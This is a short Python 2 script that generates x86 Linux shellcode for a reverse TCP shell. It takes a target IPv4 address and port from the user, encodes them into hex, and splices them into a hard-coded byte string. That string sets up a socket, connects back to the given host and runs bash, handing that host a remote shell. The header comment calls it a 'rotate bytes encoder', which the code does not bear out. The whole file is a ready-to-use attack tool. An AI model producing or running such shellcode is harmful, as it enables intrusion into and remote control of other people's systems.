#!/usr/bin/python

# Python rotate bytes encoder 
import random
import argparse
import sys
import struct

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", help="Please provide an interger between 1 and 65535", type=int, required=True)
parser.add_argument("-a","--address", help="Please provide an IPv4 address in the format: XXX.XXX.XXX.XXX", type=str, required=True)
args = parser.parse_args()

port = args.port
address = args.address

if port < 1 or port > 65535:
	print "Please pick a valid port number between 1 and 65535"
	sys.exit()
elif port > 0 and port < 1024:
	print "You will need to be root to bind to a lower port"
if len(address.split(".")) < 4:
	print "Please enter the IPv4 address in the format XXX.XXX.XXX.XXX"
	sys.exit()

# convert the address from a string to int numbers
octet1,octet2,octet3,octet4 = address.split(".")
hex_octet1 = struct.pack('<L',int(octet1)).encode('hex')[:2]
hex_octet2 = struct.pack('<L',int(octet2)).encode('hex')[:2]
hex_octet3 = struct.pack('<L',int(octet3)).encode('hex')[:2]
hex_octet4 = struct.pack('<L',int(octet4)).encode('hex')[:2]


#convert the decimal value of the port to hex
hex_port = struct.pack('<L',port).encode('hex')[:4]


#Warnings if the address or port provided contain nulls
if str(hex_port)[:2] == "00" or str(hex_port)[2:4] == "00":
	print "*** WARNING!!! Your port number will cause null bytes to be in your shellcode. You may want to use a different port number. ***\n\n"
if str(hex_octet1)[:2] == "00" or str(hex_octet2)[:2] == "00" or str(hex_octet3)[:2] == "00" or str(hex_octet4)[:2] == "00":
	print "*** WARNING!!! Your address will cause null bytes to be in your shellcode. You may want to use a different address if possible. ***\n\n"

print "Generating shellcode for a reverse TCP shell on address " + str(address) + " over port "  + str(port)
print "The hex for the address is 0x" + str(hex_octet4) + str(hex_octet3) + str(hex_octet2) + str(hex_octet1) + ".\nThe hex for the port is " + str(hex_port)[2:4]+str(hex_port)[:2]

print "\n\n"

print "Your shellcode is:"
print "\"\\x31\\xc0\\x31\\xdb\\x50\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x92\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x"+ str(hex_octet1) + "\\x" + str(hex_octet2) + "\\x" + str(hex_octet3) + "\\x" + str(hex_octet4) +"\\x66\\x68\\x"  + str(hex_port)[2:4] + "\\x" + str(hex_port)[:2] + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\""
